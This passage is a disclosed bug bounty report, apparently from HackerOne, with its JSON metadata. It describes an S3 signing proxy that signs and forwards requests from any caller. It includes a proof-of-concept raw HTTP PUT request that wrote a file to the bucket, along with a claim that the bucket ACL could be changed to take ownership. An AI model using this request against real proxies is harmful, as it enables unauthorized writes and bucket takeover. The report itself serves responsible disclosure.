You are using https://proxy.harvestfiles.com to proxy requests to this bucket. The proxy automatically signs the requests and adds the required authorization headers for your S3 user.\n\nHowever, an attacker can then simply impersonate the user and create arbitrary requests which will be signed and forwarded to the S3 bucket. \n\nProof of Concept\n-----------\n\nAs a proof of concept I have created a file on the bucket: █████████\n\nThis was done by issuing the following request:\n\n```\nPUT ███████ HTTP/1.1\nHost: proxy.harvestfiles.com\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\narbitrary-write\n```\n\nImpact\n--------\n\nOf course, instead of just writing one file, I can change the access control policy and add my own account as the owner. If you check the acl: ████ \nyou will see the user ██████████ has full control over the bucket and with your proxy he basically acts on our behalf.","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-09-10T22:00:00.901Z","allow_singular_disclosure_after":-160415123.34183374,"singular_disclosure_allowed":true,"vote_count":36,"voters":["iamnoooob","michiel","bogdantcaciuc","yaworsk","dmatrix","geekboy","ysx","zee_shan","yassineaboukir","gamliel","and 26 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1078301,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Edgar,\n\nThanks a lot for reporting this amazing finding!
